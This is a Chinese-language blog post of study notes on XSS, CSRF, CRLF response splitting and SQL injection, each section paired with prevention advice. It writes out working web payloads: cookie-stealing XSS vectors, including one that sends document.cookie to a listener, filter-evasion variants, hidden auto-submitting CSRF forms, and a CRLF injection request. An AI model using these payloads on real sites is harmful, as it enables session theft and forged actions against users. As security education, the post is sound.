<!doctype html><html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta><title>XSS, CSRF, CRLF, SQL注入学习笔记 - 虹墨空间站</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="虹墨空间站"><meta name="msapplication-TileImage" content="/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="虹墨空间站"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="XSS, CSRF, CRLF, SQL注入都是历史悠久的四种攻击方式，因为参数化查询已经成了普遍用法，我们已经离SQL注入很远了，但是，XSS，CSRF，CRLF却没有远离我们。 本文以初学者角度探讨四种Web攻击以及预防方式，是个人基于对多种Web漏洞的学习总结，不承诺内容规范。"><meta property="og:type" content="article"><meta property="og:title" content="XSS, CSRF, CRLF, SQL注入学习笔记"><meta property="og:url" content="https://www.imaegoo.com/2019/web-security/"><meta property="og:site_name" content="虹墨空间站"><meta property="og:description" content="XSS, CSRF, CRLF, SQL注入都是历史悠久的四种攻击方式，因为参数化查询已经成了普遍用法，我们已经离SQL注入很远了，但是，XSS，CSRF，CRLF却没有远离我们。 本文以初学者角度探讨四种Web攻击以及预防方式，是个人基于对多种Web漏洞的学习总结，不承诺内容规范。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.imaegoo.com/gallery/2019/security.jpg"><meta property="article:published_time" content="2019-05-24T14:04:53.000Z"><meta property="article:modified_time" content="2019-05-27T06:10:00.000Z"><meta property="article:author" content="iMaeGoo"><meta property="article:tag" content="security"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://www.imaegoo.com/gallery/2019/security.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.imaegoo.com/2019/web-security/"},"headline":"XSS, CSRF, CRLF, SQL注入学习笔记","image":["https://www.imaegoo.com/gallery/2019/security.jpg"],"datePublished":"2019-05-24T14:04:53.000Z","dateModified":"2019-05-27T06:10:00.000Z","author":{"@type":"Person","name":"iMaeGoo"},"publisher":{"@type":"Organization","name":"虹墨空间站","logo":{"@type":"ImageObject","url":{"light":"/images/logo.png","dark":"/images/logo-dark.png"}}},"description":"XSS, CSRF, CRLF, SQL注入都是历史悠久的四种攻击方式，因为参数化查询已经成了普遍用法，我们已经离SQL注入很远了，但是，XSS，CSRF，CRLF却没有远离我们。 本文以初学者角度探讨四种Web攻击以及预防方式，是个人基于对多种Web漏洞的学习总结，不承诺内容规范。"}</script><link rel="canonical" href="https://www.imaegoo.com/2019/web-security/"><link rel="alternate" href="/atom.xml" title="虹墨空间站" type="application/atom+xml"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/font/fontawesome/css/all.min.css"><link data-pjax rel="stylesheet" href="/js/imaegoo/highlight.js/11.7.0/styles/vs.css"><link data-pjax rel="stylesheet" href="/css/default.css"><script src="https://vercount.one/js" defer="defer"></script><link rel="stylesheet" href="/js/imaegoo/lightgallery/1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="/js/imaegoo/justifiedGallery/3.8.1/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-RCCCLYKRH5" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-RCCCLYKRH5")</script><link rel="stylesheet" href="/js/imaegoo/cookieconsent/3.1.1/build/cookieconsent.min.css"><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><meta name="generator" content="Hexo 7.1.1"></head><body class="is-3-column"><script type="text/javascript" src="/js/imaegoo/night.js"></script><canvas id="universe"></canvas><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img class="logo-img" src="/images/logo.png" alt="虹墨空间站" height="28"><img class="logo-img-dark" src="/images/logo-dark.png" alt="虹墨空间站" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives/">时间轴</a><a class="navbar-item" href="/categories/">分类</a><a class="navbar-item" href="/tags/">标签</a><a class="navbar-item" href="/messages/">留言板</a><a class="navbar-item" href="/friends/">友情链接</a><a class="navbar-item" href="/moments/">友链朋友圈</a><a class="navbar-item" href="/about/">关于</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i><span>  目录</span></a><a class="navbar-item night" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="/gallery/2019/security.jpg" alt="XSS, CSRF, CRLF, SQL注入学习笔记" referrerpolicy="no-referrer"></span></div><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time datetime="2019-05-24T14:04:53.000Z" title="2019/5/24 22:04:53">2019-05-24</time>发表</span><span class="level-item"><time datetime="2019-05-27T06:10:00.000Z" title="2019/5/27 14:10:00">2019-05-27</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/tech/">Tech</a><span> / </span><a class="link-muted" href="/categories/tech/frontend/">FrontEnd</a></span><span class="level-item">22 分钟读完 (大约3246个字)</span><span class="level-item leancloud_visitors" id="/2019/web-security/" data-flag-title="XSS, CSRF, CRLF, SQL注入学习笔记"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="twikoo_visitors"><i class="fa fa-spinner fa-spin"></i></span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">XSS, CSRF, CRLF, SQL注入学习笔记</h1><div class="content"><p>XSS, CSRF, CRLF, SQL注入都是历史悠久的四种攻击方式，因为参数化查询已经成了普遍用法，我们已经离SQL注入很远了，但是，XSS，CSRF，CRLF却没有远离我们。</p><p>本文以初学者角度探讨四种Web攻击以及预防方式，是个人基于对多种Web漏洞的学习总结，不承诺内容规范。</p><span id="more"></span><h3 id="XSS-跨站脚本"><a href="#XSS-跨站脚本" class="headerlink" title="XSS 跨站脚本"></a>XSS 跨站脚本</h3><p>跨站脚本（XSS，Cross Site Scripting）攻击是一种注入攻击，其恶意脚本被注入到其他可信网站中。当攻击者使用Web应用将恶意代码（通常以浏览器脚本的形式）发送给不同的最终用户时，就会发生XSS攻击。</p><p>允许这些攻击成功的缺陷非常普遍，并且发生在Web应用程序在其生成的输出中使用来自用户的输入而无需验证或编码它的任何地方。</p><p>攻击者可以使用XSS将恶意脚本发送给毫无戒心的用户。最终用户的浏览器无法知道该脚本不应该被信任，并将执行该脚本。</p><p>因为它认为脚本来自可靠来源，所以恶意脚本可以访问任何cookies，session tokens或浏览器保留并与该站点一起使用的其他敏感信息（比如<code>document.cookie</code>）。这些脚本甚至可以重写HTML页面的内容（比如<code>document.body.innerHTML=&quot;&quot;</code>）。</p><p>XSS攻击通常可以分为两类：存储和反射。还有第三种不太知名的XSS攻击类型，称为基于DOM的XSS。</p><h4 id="存储XSS"><a href="#存储XSS" class="headerlink" title="存储XSS"></a>存储XSS</h4><p>又名AKA Persistent，Type I</p><p>存储XSS通常在用户输入存储在目标服务器上时发生，例如在<strong>数据库，文件，论坛消息，访问日志</strong>等中，导致永久性的每次存储数据反射回响应文代码就会在浏览器中执行的一种XSS漏洞。</p><h4 id="反射XSS"><a href="#反射XSS" class="headerlink" title="反射XSS"></a>反射XSS</h4><p>又名AKA Non-Persistent，Type II</p><p>当Web应用程序在错误消息，搜索结果或包含用户作为请求的一部分提供的部分或全部输入的任何其他响应中立即返回用户输入，导致代码在浏览器执行时，会发生反射的XSS。</p><h4 id="基于DOM的XSS"><a href="#基于DOM的XSS" class="headerlink" title="基于DOM的XSS"></a>基于DOM的XSS</h4><p>又名AKA Type-0<br>Amit Klein，发表了关于这个问题的<a target="_blank" rel="noopener" href="http://www.webappsec.org/projects/articles/071105.shtml">第一篇文章</a>，基于DOM的XSS是XSS的一种形式，其中从源到接收的整个受污染的数据流在浏览器中发生，即数据的来源是在DOM中，接收器也在DOM中，数据流永远不会离开浏览器。例如，源（读取恶意数据）可以是页面的URL（例如，document.location.href），或者它可以是HTML的元素，而接收器是一个敏感的方法调用，导致执行恶意数据（例如<code>document.write</code>）。</p><p>设想，某博客留言板允许插入第三方图片，输入图片URL后，会生成img标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片地址&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>普通图片地址：<code>https://img.com/img.png</code></p><p>XSS地址：<code>https://img.com/img.png&quot; onload=&quot;javascript:alert(document.cookie);</code></p><p>文档呈现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img.com/img.png&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;javascript:alert(document.cookie);&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>扩展：</p><p>多年来，大多数人认为这些（存储，反射，DOM）是三种不同类型的XSS，但实际上它们是重叠的。你可以同时拥有存储和反射的基于DOM的XSS。你也可以使用存储和反映的非基于DOM的XSS。所以为了帮助澄清，从2012年中开始，研究团体提出并开始使用新术语来帮助组织可能发生的XSS类型：</p><ul><li>服务器存储XSS</li><li>客户端存储XSS</li><li>服务器反射XSS</li><li>客户端反射XSS</li></ul><p>此处不讲解，参考：<a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting">https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting</a></p><h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><p>在实际项目中实施XSS攻击，获取用户cookie信息。<br>搭建Spring Boot Web项目，配置第三方服务以接收用户cookie信息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(document.cookie)&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;$.ajax(&#123;url:&quot;http://localhost:8084/xss?s=&quot;+document.cookie&#125;)&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="备用XSS语法"><a href="#备用XSS语法" class="headerlink" title="备用XSS语法"></a>备用XSS语法</h4><p>XSS在属性中使用脚本<br>可以在不使用<code>&lt;script&gt;</code>标记的情况下进行XSS攻击。其他标签将完全相同，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.cookie)</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://url.to.file.which/not.exist&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XSS使用脚本通过编码的URI方案<br>如果我们需要隐藏Web应用程序过滤器，我们可能会尝试对字符串字符进行编码，例如：<code>a=&amp;#X41 (UTF-8)</code>并在IMG标记中使用它：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">j&amp;#X41vascript:alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有许多不同的UTF-8编码符号为我们提供了更多的可能性。</p><p>XSS使用代码编码<br>我们可以在base64中对脚本进行编码并将其放在META标记中。这样我们完全摆脱了alert()。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这些和其他示例可以在<a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a>中找到，它是备用XSS语法攻击的真正百科全书。</p><h4 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h4><ol><li>对用户输入进行转义（<code>&lt;</code>转义<code>&amp;lt;</code>，<code>&gt;</code>转义<code>&amp;gt;</code>，<code>&quot;</code>转义<code>&amp;quot;</code>，空格转义<code>&amp;nbsp;</code>）</li><li>AngularJS 谨慎使用 <code>ng-bind-html</code>，<code>$sce.trustAsHtml()</code></li><li>CK editor 谨慎使用 <code>ck.config.allowedContent</code>（HTML内容过滤，<a target="_blank" rel="noopener" href="https://ckeditor.com/docs/ckeditor4/latest/api/CKEDITOR_config.html#cfg-allowedContent">建议在设置之前阅读安全性最佳实践</a>）</li><li>对必须允许的HTML输入设置白名单过滤（GitHub的做法，Jsoup类库也可以很方便地实现，参考<a target="_blank" rel="noopener" href="https://jsoup.org/cookbook/cleaning-html/whitelist-sanitizer">Sanitize untrusted HTML</a>）</li><li>添加必要的 HTTP 响应头进行 XSS 防护</li></ol><table><thead><tr><th>HTTP响应头</th><th>描述</th></tr></thead><tbody><tr><td>X-XSS-Protection: 1; mode&#x3D;block</td><td>该响应头会开启浏览器的防 XSS 过滤器</td></tr><tr><td>X-Frame-Options: deny</td><td>该响应头会禁止页面被加载到框架</td></tr><tr><td>X-Content-Type-Options: nosniff</td><td>该响应头会禁用客户端的 MIME 类型嗅探行为，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhangzhijian/p/10579801.html">参考这里</a></td></tr><tr><td>Content-Security-Policy: default-src ‘self’</td><td>该响应头是防止 XSS 最有效的解决方案之一。它允许我们定义从 URLs 或内容中加载和执行对象的策略，<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a8b769e7d4bd">参考这里</a></td></tr><tr><td>Set-Cookie: key&#x3D;value; HttpOnly</td><td>Set-Cookie 响应头通过 HttpOnly 标签的设置将限制 JavaScript 访问你的 Cookie</td></tr><tr><td>Content-Type: type&#x2F;subtype;charset&#x3D;utf-8</td><td>始终设置响应的内容类型和字符集</td></tr></tbody></table><h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h3><p>CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。</p><h4 id="GET场景"><a href="#GET场景" class="headerlink" title="GET场景"></a>GET场景</h4><p>通常使用以下技术之一完成：</p><ul><li>发送带有HTML内容的电子邮件</li><li>网页上植入网址或脚本</li></ul><p>漏洞利用网址可以伪装成普通链接，鼓励受害者点击它：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/rest/users/delete-all&quot;</span>&gt;</span>click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者作为0x0假图像：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;/rest/users/delete-all&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="POST场景"><a href="#POST场景" class="headerlink" title="POST场景"></a>POST场景</h4><p>GET和POST攻击之间的唯一区别是受害者如何执行攻击。<br>此类请求无法使用标准<code>a</code>或<code>img</code>标记进行传递，但可以使用<code>form</code>进行传递：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/rest/users/delete-all&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;clientId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此表单将要求用户单击提交按钮，但这也可以使用JavaScript自动执行：</p><p>首先在另一个网站上传以下代码：</p><figure class="highlight html"><figcaption><span>main.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en-US&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Main<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>正常内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;iframe1&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;frame.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><figcaption><span>frame.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en-US&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF frame<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/rest/users/delete-all&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;clientId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">forms</span>.<span class="property">form1</span>.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当被攻击用户去访问main.html时，他浑然不知浏览器悄悄地给另一个网站发送了修改设置的请求，显然浏览器在发送请求时自觉地还带上了被攻击网站的cookie。</p><p><img src="/gallery/2019/csrf.png"></p><p>如果把代码中的action换成微博的API，我们就能实现：如果你的浏览器已登录了微博，那你访问这篇文章的同时，就自动关注了我的微博。</p><p>究其原因：</p><ol><li>form可以跨域post数据。</li><li>Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。</li></ol><p>学到这里我突然想到一个问题，JS可以读取页面iframe元素的内容，那我是否可以实现CSRF的同时读取到服务端返回值了呢？这样岂不是可以造成数据泄露？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> contentWindow = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;iframe1&quot;</span>).<span class="property">contentWindow</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(contentWindow.<span class="property">document</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>开发浏览器的人早就想到了这个问题，只要是跨域的iframe读取与操作，都是不允许的。<br><code>Uncaught DOMException: Blocked a frame with origin &quot;null&quot; from accessing a cross-origin frame.</code></p><h4 id="组合XSS实现XSRF"><a href="#组合XSS实现XSRF" class="headerlink" title="组合XSS实现XSRF"></a>组合XSS实现XSRF</h4><p>直接把上面代码利用XSS漏洞，嵌入被攻击站点，这组合攻击方式称为XSRF。</p><h4 id="预防-1"><a href="#预防-1" class="headerlink" title="预防"></a>预防</h4><p>CSRF攻击的一般是由服务端解决。</p><ul><li>遵循RESTful规范，避免在GET请求中作数据修改操作</li><li>添加特殊请求参数做验证<ul><li>验证码</li><li>Referer Check</li><li>Anti CSRF Token</li></ul></li></ul><p>如果网站同时存在XSS漏洞，依然可以通过JS获取到Token。</p><h3 id="CRLF-返回头拆分"><a href="#CRLF-返回头拆分" class="headerlink" title="CRLF 返回头拆分"></a>CRLF 返回头拆分</h3><h4 id="参数注入返回头"><a href="#参数注入返回头" class="headerlink" title="参数注入返回头"></a>参数注入返回头</h4><p>CRLF是”回车换行”（<code>\r\n</code>）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF区分HTTP头和HTTP体。</p><p>所以，一旦我们能够控制HTTP头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p><p>在以下情况下发生HTTP响应拆分：</p><ul><li>数据通过不受信任的来源进入Web应用程序，最常见的是HTTP请求。</li><li>数据包含在发送给Web用户的HTTP响应标头中，而不会对恶意字符进行验证。</li></ul><p>对于HRS最简单的利用方式是注入两个\r\n，之后写入XSS代码，来构造一个XSS。</p><p>比如一个网站接受URL参数<code>/redirect?url=</code>，URL放在Response Location后面跳转。</p><figure class="highlight http"><figcaption><span>Request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/redirect?url=new-page</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><figcaption><span>Response</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span></span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>new-page</span><br></pre></td></tr></table></figure><p>如果我们输入的是</p><figure class="highlight http"><figcaption><span>Request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/redirect?url=%0d%0a%0d%0a&lt;img</span> src=1 <span class="string">onerror=alert(/xss/)&gt;</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><figcaption><span>Response</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span></span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span></span><br><span class="line"></span><br><span class="line"><span class="language-routeros">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(/xss/)&gt;</span></span><br></pre></td></tr></table></figure><p>糟了，由于Location为空，Chrome并没有跳转，而是把两个CRLF后的<code>&lt;ing&gt;</code>渲染了出来，造成了XSS注入。</p><p>此攻击方式由于会注入返回头，危害大于XSS，其能够轻松修改返回头，导致浏览器XSS Auditor，Frame Deny等防护失效，还能恶意注入cookie的<code>JSESSIONID</code>实现会话固定漏洞。</p><h4 id="预防-2"><a href="#预防-2" class="headerlink" title="预防"></a>预防</h4><ul><li>过滤\r，\n，并且避免输入的数据污染到其他HTTP头。</li></ul><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p><code>TODO</code></p><p>SQL注入攻击通过从客户端或Web到服务端的输入数据包括SQL查询的注入。成功的SQL注入攻击可以从数据库读取敏感数据，修改数据库数据（插入&#x2F;更新&#x2F;删除），对数据库执行管理操作（如关闭DBMS），恢复DBMS文件中存在的给定文件的内容系统并在某些情况下向操作系统发出命令。</p><h4 id="拼接注入"><a href="#拼接注入" class="headerlink" title="拼接注入"></a>拼接注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span>md5(<span class="string">&#x27;test&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="预防-3"><a href="#预防-3" class="headerlink" title="预防"></a>预防</h4><ol><li>对用户的输入进行校验，可以通过正则表达式，或限制长度。</li><li>使用参数化SQL或存储过程。</li><li>为每个应用使用单独的权限有限的数据库连接。</li><li>应用的异常信息应该给出尽可能少的提示，使用自定义的错误信息对原始错误信息进行包装。</li></ol><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ol><li><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">Cross-site Scripting (XSS)</a></li><li><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting">Types of Cross-Site Scripting</a></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lovesong/p/5211667.html">HtmlEncode和JavaScriptEncode（预防XSS）</a></li><li><a target="_blank" rel="noopener" href="https://jsoup.org/cookbook/cleaning-html/whitelist-sanitizer">Sanitize untrusted HTML (to prevent XSS)</a></li><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/138769.html">安全隐患，你对X-XSS-Protection头部字段理解可能有误</a></li><li><a target="_blank" rel="noopener" 